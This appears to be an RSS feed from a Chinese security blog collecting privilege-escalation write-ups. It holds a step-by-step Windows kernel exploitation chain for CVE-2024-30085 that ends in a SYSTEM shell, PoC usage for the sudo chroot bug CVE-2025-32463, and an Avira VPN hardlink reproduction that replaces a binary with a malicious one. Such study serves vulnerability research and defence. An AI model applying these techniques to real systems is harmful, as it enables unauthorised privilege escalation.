<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>权限提升 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</link>
        <description>Recent content in 权限提升 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Fri, 08 Aug 2025 20:26:58 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Windows cldflt.sys驱动堆溢出漏洞CVE-2024-30085分析与利用</title>
        <link>http://localhost:1313/p/windows-cldflt.sys%E9%A9%B1%E5%8A%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9Ecve-2024-30085%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Fri, 08 Aug 2025 20:26:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/windows-cldflt.sys%E9%A9%B1%E5%8A%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9Ecve-2024-30085%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;tldr&#34;&gt;TLDR
&lt;/h1&gt;&lt;p&gt;CVE-2024-30085是影响Windows云文件迷你过滤器驱动cldflt.sys的基于堆的缓冲区溢出漏洞。通过构造特殊的重解析点，可以触发缓冲区溢出破坏相邻的_WNF_STATE_DATA对象。被破坏的_WNF_STATE_DATA对象可用于从ALPC句柄表对象泄露内核指针。第二次缓冲区溢出用于破坏另一个_WNF_STATE_DATA对象，进而破坏相邻的PipeAttribute对象。通过在用户空间伪造PipeAttribute对象，我们能够泄露令牌地址并覆盖权限，将权限提升至NT AUTHORITY\SYSTEM。&lt;/p&gt;
&lt;h1 id=&#34;漏洞分析与补丁&#34;&gt;漏洞分析与补丁
&lt;/h1&gt;&lt;p&gt;CVE-2024-30085是由SSD Secure Disclosure的Alex Birnberg以及Theori的Gwangun Jung和Junoh Lee发现的基于堆的缓冲区溢出漏洞。对于Windows 10 22H2，该漏洞在KB5039211更新中被修复。&lt;/p&gt;
&lt;p&gt;查看补丁差异，可以清楚地看到HsmIBitmapNORMALOpen函数已被修改。在未打补丁的函数中，驱动程序在分页池中分配了一个大小为0x1000的HsBm对象，并将memcpy_size大小的数据复制到分配的缓冲区中。由于用户可以控制复制的数据以及memcpy_size的值，如果memcpy_size大于0x1000，就会发生分页池中的堆缓冲区溢出！&lt;/p&gt;
&lt;h1 id=&#34;重解析点结构&#34;&gt;重解析点结构
&lt;/h1&gt;&lt;p&gt;重解析点包含一个重解析标签（标识拥有该重解析点的文件系统驱动程序）和用户定义的数据。在本例中，我们将使用IO_REPARSE_TAG_CLOUD_6(0x9000601a)作为重解析标签。&lt;/p&gt;
&lt;p&gt;用户定义的数据具有以下结构：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_REPARSE_DATA_BUFFER&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ULONG&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;ReparseTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;USHORT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ReparseDataLength&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;USHORT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Reserved&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;UCHAR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DataBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GenericReparseBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REPARSE_DATA_BUFFER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PREPARSE_DATA_BUFFER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;触发漏洞&#34;&gt;触发漏洞
&lt;/h1&gt;&lt;p&gt;让我们看看触发漏洞所需的代码路径：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-&amp;gt; HsmFltPostCREATE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -&amp;gt; HsmiFltPostECPCREATE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        -&amp;gt; HsmpSetupContexts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            -&amp;gt; HsmpCtxCreateStreamContext
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                -&amp;gt; HsmIBitmapNORMALOpen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过打开包含cldflt重解析数据的文件，我们能够到达HsmpCtxCreateStreamContext。但是，为了到达HsmIBitmapNORMALOpen触发易受攻击的memcpy，我们必须通过一些与FeRp对象及其嵌套的BtRp对象相关的检查。&lt;/p&gt;
&lt;h1 id=&#34;利用概述&#34;&gt;利用概述
&lt;/h1&gt;&lt;p&gt;目前，我们在分页池中有一个溢出，影响大小为0x1000的对象。为了提升权限，我们需要一个内核指针泄露和任意写入能力。我们计划触发这个漏洞两次——第一次获取内核泄露并获得任意写入原语，第二次获取任意读取能力从而获取令牌地址。&lt;/p&gt;
&lt;p&gt;完整的利用步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建漏洞利用文件1并设置大小为0x1010的自定义重解析点数据&lt;/li&gt;
&lt;li&gt;喷洒填充_WNF_STATE_DATA&lt;/li&gt;
&lt;li&gt;喷洒第一组_WNF_STATE_DATA对象&lt;/li&gt;
&lt;li&gt;通过释放每隔一个_WNF_STATE_DATA对象来打孔&lt;/li&gt;
&lt;li&gt;第一次触发漏洞以回收其中一个孔——这会破坏_WNF_STATE_DATA对象，给我们越界读写能力&lt;/li&gt;
&lt;li&gt;喷洒ALPC句柄表以回收剩余的孔&lt;/li&gt;
&lt;li&gt;通过从第一个被破坏的_WNF_STATE_DATA对象读取泄露内核指针&lt;/li&gt;
&lt;li&gt;创建漏洞利用文件2并设置大小为0x1010的自定义重解析点数据&lt;/li&gt;
&lt;li&gt;喷洒第二组填充_WNF_STATE_DATA&lt;/li&gt;
&lt;li&gt;通过释放每隔一个_WNF_STATE_DATA对象来打孔&lt;/li&gt;
&lt;li&gt;第二次触发漏洞以回收其中一个孔&lt;/li&gt;
&lt;li&gt;喷洒PipeAttribute以回收剩余的孔&lt;/li&gt;
&lt;li&gt;使用第二个被破坏的_WNF_STATE_DATA对象破坏PipeAttribute对象，使其指向用户空间中的伪造对象——这给了我们任意读取能力&lt;/li&gt;
&lt;li&gt;使用被破坏的PipeAttribute对象获取令牌地址&lt;/li&gt;
&lt;li&gt;使用第一个被破坏的_WNF_STATE_DATA对象破坏ALPC句柄表，给我们任意写入能力&lt;/li&gt;
&lt;li&gt;覆盖令牌权限获取完全权限！&lt;/li&gt;
&lt;li&gt;获取winlogon进程的句柄&lt;/li&gt;
&lt;li&gt;弹出NT AUTHORITY\SYSTEM shell！！！&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;获取内核指针泄露&#34;&gt;获取内核指针泄露
&lt;/h1&gt;&lt;p&gt;我们将使用两个内核对象来获取内核指针泄露：_WNF_STATE_DATA和_ALPC_HANDLE_TABLE。&lt;/p&gt;
&lt;p&gt;Windows通知设施(WNF)是一个未记录的内核组件，用于在系统间发送通知。用于发送通知的数据存储在_WNF_STATE_DATA对象中，该对象分配在分页池中，由一个大小为0x10的头部和紧随其后的数据组成。&lt;/p&gt;
&lt;p&gt;高级本地过程调用(ALPC)是Windows内核中未记录的内部进程间通信设施。当创建ALPC端口时，_ALPC_HANDLE_TABLE对象最初以0x80的大小分配在分页池中。每次调用NtAlpcCreateResourceReserve时，都会创建一个_KALPC_RESERVE blob，并调用AlpcAddHandleTableEntry将其地址添加到句柄表中。&lt;/p&gt;
&lt;h1 id=&#34;任意读取&#34;&gt;任意读取
&lt;/h1&gt;&lt;p&gt;现在我们有了内核指针泄露，我们想要获得任意读取能力以便获取令牌地址。为此，可以第二次触发漏洞来覆盖第二个_WNF_STATE_DATA数据对象。与之前一样，我们将喷洒_WNF_STATE_DATA，通过释放每隔一个对象来打孔，然后触发漏洞导致溢出并破坏相邻的_WNF_STATE_DATA对象。但这次，我们将喷洒PipeAttribute，并使用被破坏的_WNF_STATE_DATA来破坏相邻的PipeAttribute结构。&lt;/p&gt;
&lt;p&gt;PipeAttribute任意读取技术由Corentin Bayet和Paul Fariello在他们的论文中提出。当创建管道时，用户可以添加属性，这些属性随后以键值对的形式存储在链表中。PipeAttribute是一个可变大小的结构，分配在分页池中。&lt;/p&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
&lt;/h1&gt;&lt;p&gt;现在我们有了令牌地址，我们最终可以将权限提升到NT AUTHORITY\SYSTEM！&lt;/p&gt;
&lt;p&gt;记住我们用来泄露ALPC句柄表中_KALPC_RESERVE指针的第一个_WNF_STATE_DATA吗？我们可以使用相同的_WNF_STATE_DATA对象用指向用户空间中伪造的_KALPC_RESERVE结构的指针覆盖该指针。在_KALPC_RESERVE内部，有一个指向_KALPC_MESSAGE的指针。&lt;/p&gt;
&lt;p&gt;在_KALPC_MESSAGE内部，有两个我们感兴趣的字段：ExtensisonBuffer和ExtensionBufferSize。当调用NtAlpcSendWaitReceivePort时，用户可控的ExtensionBufferSize大小的数据被写入ExtensionBuffer。为了获得任意写入，我们可以让我们的伪造_KALPC_RESERVE结构指向一个伪造的_KALPC_MESSAGE结构（也在用户空间中），将ExtensionBuffer设置为我们想要写入的位置！&lt;/p&gt;
&lt;p&gt;在这种情况下，我们将ExtensionBuffer设置为令牌权限（位于偏移量0x40），ExtensionBufferSize设置为0x10，这样我们可以写入16个\xff，这将启用所有权限。&lt;/p&gt;
&lt;h1 id=&#34;漏洞利用演示&#34;&gt;漏洞利用演示
&lt;/h1&gt;&lt;p&gt;这是漏洞利用运行时的样子：&lt;/p&gt;
&lt;p&gt;[图片描述漏洞利用成功运行]&lt;/p&gt;
&lt;p&gt;漏洞利用源代码可以在此处获取。&lt;/p&gt;
&lt;h1 id=&#34;致谢&#34;&gt;致谢
&lt;/h1&gt;&lt;p&gt;我要感谢Chen Le Qi在我研究这个漏洞时的耐心指导——我真的学到了很多！&lt;/p&gt;
&lt;h1 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;Windows云过滤器API文档&lt;/li&gt;
&lt;li&gt;占位文件文档&lt;/li&gt;
&lt;li&gt;重解析点文档&lt;/li&gt;
&lt;li&gt;Windows结构体参考&lt;/li&gt;
&lt;li&gt;云过滤器重解析数据结构&lt;/li&gt;
&lt;li&gt;ALPC技术论文&lt;/li&gt;
&lt;li&gt;PipeAttribute技术论文&lt;/li&gt;
&lt;li&gt;Windows内核堆分析&lt;/li&gt;
&lt;li&gt;使用ALPC和PipeAttribute利用CVE-2023-36424&lt;/li&gt;
&lt;li&gt;WNF堆喷洒技术&lt;/li&gt;
&lt;li&gt;从句柄创建进程技术&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>CVE-2025-32463漏洞利用：Sudo chroot本地提权漏洞分析</title>
        <link>http://localhost:1313/p/cve-2025-32463%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8sudo-chroot%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Fri, 08 Aug 2025 03:01:33 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cve-2025-32463%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8sudo-chroot%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;cve-2025-32463---sudo-chroot漏洞利用&#34;&gt;CVE-2025-32463 - sudo chroot漏洞利用
&lt;/h1&gt;&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker build -t cve .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it cve
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./poc.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍
&lt;/h2&gt;&lt;p&gt;该漏洞是一个涉及Sudo chroot功能的本地权限提升漏洞。利用此漏洞不需要为用户定义任何sudo规则。因此，如果安装了存在漏洞的sudo版本，任何本地用户都可能提升到root权限。&lt;/p&gt;
&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;稳定版1.9.14至1.9.17&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意：Sudo版本&amp;lt;=1.8.32不受影响，因为这些版本不存在chroot功能&lt;/p&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢
&lt;/h2&gt;&lt;p&gt;CVE-2025-32463 Sudo chroot权限提升漏洞由Stratascale网络研究部门的Rich Mirch发现。所有研究和PoC的功劳都归于他。请访问以下链接支持并阅读完整研究报告：https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Avira VPN 2.15.2.28160本地权限提升漏洞分析</title>
        <link>http://localhost:1313/p/avira-vpn-2.15.2.28160%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Thu, 07 Aug 2025 15:56:31 +0800</pubDate>
        
        <guid>http://localhost:1313/p/avira-vpn-2.15.2.28160%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;产品信息&#34;&gt;产品信息
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;版本&lt;/strong&gt;: Avira Phantom VPN 2.15.2.28160&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;下载源&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;https://package.avira.com/package/oeavira/win/int/avira_en_vpn__ws.exe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方安装包链接&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试系统&lt;/strong&gt;: Windows 10 1803 (x64)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h3&gt;&lt;p&gt;Avira VPN服务在修改VPN配置时，会调整&lt;code&gt;C:\ProgramData\Avira\VPN\&lt;/code&gt;目录下&lt;code&gt;VpnSharedSettings.backup&lt;/code&gt;和&lt;code&gt;VpnSharedSettings.config&lt;/code&gt;文件的DACL（自主访问控制列表）。通过创建硬链接指向目标文件（如&lt;code&gt;phantomvpn.exe&lt;/code&gt;），攻击者可利用此漏洞覆盖目标文件的DACL，最终实现从低权限用户到SYSTEM的权限提升。&lt;/p&gt;
&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;触发条件&lt;/strong&gt;: 通过VPN GUI修改配置（如取消勾选“发送诊断数据”）时，服务端调用&lt;code&gt;Avira.VPN.Core.dll&lt;/code&gt;中的&lt;code&gt;AdjustSecurity()&lt;/code&gt;函数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限修改&lt;/strong&gt;: 对于共享配置文件（&lt;code&gt;StorageType&lt;/code&gt;为&lt;code&gt;AllUserAccess&lt;/code&gt;），服务会将文件DACL设置为允许所有认证用户完全控制。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用链&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;攻击者创建硬链接，将&lt;code&gt;VpnSharedSettings.backup&lt;/code&gt;指向目标文件（如&lt;code&gt;phantomvpn.exe&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;触发配置更改后，目标文件的DACL被覆盖为低权限用户可写。&lt;/li&gt;
&lt;li&gt;替换目标文件为恶意二进制，并通过VPN连接触发执行，获得SYSTEM权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;创建硬链接指向&lt;code&gt;phantomvpn.exe&lt;/code&gt;:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mklink&lt;/span&gt; /H C:\ProgramData\Avira\VPN\VpnSharedSettings.backup &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files (x86)\Avira\VPN\OpenVPN\phantomvpn.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在VPN设置中取消勾选“发送诊断数据”，触发DACL修改。&lt;/li&gt;
&lt;li&gt;替换&lt;code&gt;phantomvpn.exe&lt;/code&gt;为恶意程序，点击“Secure my Connection”执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;时间线&#34;&gt;时间线
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2018年9月28日&lt;/strong&gt;: 向Avira报告&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2018年10月4日&lt;/strong&gt;: Avira确认复现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2018年12月13日&lt;/strong&gt;: 漏洞修复&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关联漏洞&#34;&gt;关联漏洞
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5&#34; &gt;Avira VPN通过不安全更新路径的本地提权（2020年1月）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5&#34; &gt;Avira Optimizer本地提权漏洞（2019年8月）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>服务隔离技术解析：Windows服务安全与权限提升漏洞分析</title>
        <link>http://localhost:1313/p/%E6%9C%8D%E5%8A%A1%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90windows%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Thu, 07 Aug 2025 04:30:33 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%9C%8D%E5%8A%A1%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90windows%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h2 id=&#34;服务隔离技术说明&#34;&gt;服务隔离技术说明
&lt;/h2&gt;&lt;p&gt;过去几天，在Cesar Cerrudo发布概念验证代码后，服务隔离问题成为我们关注的重点。IIS团队的Nazim Lala已发布详细博客说明修复方案及耗时原因。该补丁的代码修改量预计接近XP SP2级别，我们需要将Vista服务加固的大量基础设施工作回溯移植到旧版本系统，这对安全更新而言是项浩大工程。&lt;/p&gt;
&lt;h3 id=&#34;受影响用户范围&#34;&gt;受影响用户范围
&lt;/h3&gt;&lt;p&gt;攻击者需要满足以下条件才能利用此漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在Windows服务上下文中执行代码&lt;/li&gt;
&lt;li&gt;进程令牌需具备SeImpersonatePrivilege权限&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;典型攻击场景包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;托管服务商运行不可信代码的IIS环境&lt;/li&gt;
&lt;li&gt;SQL Server场景中，数据库管理员拥有数据库权限但无主机权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;检测方法&#34;&gt;检测方法
&lt;/h3&gt;&lt;p&gt;使用Process Explorer检查运行不可信代码的进程令牌：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;双击目标进程&lt;/li&gt;
&lt;li&gt;查看&amp;quot;Security&amp;quot;标签页&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例1：以NETWORK SERVICE身份运行的Svchost
![Svchost进程示例]&lt;/p&gt;
&lt;p&gt;示例2：以普通用户身份运行的cmd.exe
![cmd进程示例]&lt;/p&gt;
&lt;h3 id=&#34;漏洞触发条件&#34;&gt;漏洞触发条件
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;进程令牌具有SeImpersonatePrivilege权限&lt;/li&gt;
&lt;li&gt;进程运行权限低于SYSTEM级别&lt;/li&gt;
&lt;li&gt;进程执行不可信代码或允许不可信用户执行代码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;符合条件的环境请务必参考[安全建议951306]实施缓解措施。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;本文档按&amp;quot;原样&amp;quot;提供，不提供任何担保。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入探讨任务计划程序的服务账户使用技巧</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Wed, 06 Aug 2025 12:52:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%AE%A8%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;p&gt;最近我在研究一个以完整虚拟服务账户（而非LOCAL SERVICE或NETWORK SERVICE）运行的服务，但该服务移除了SeImpersonatePrivilege权限。在寻找解决方案时，我回忆起Andrea Pierini曾发表过关于使用虚拟服务账户的博客，于是决定从中寻找灵感。有趣的是，他提到Clément Labro发现的滥用任务计划程序的技术（适用于LS或NS账户）在虚拟服务账户上无效。出于好奇，我决定深入研究这个问题，并在此过程中发现了一个可用于其他目的的隐蔽技术。&lt;/p&gt;
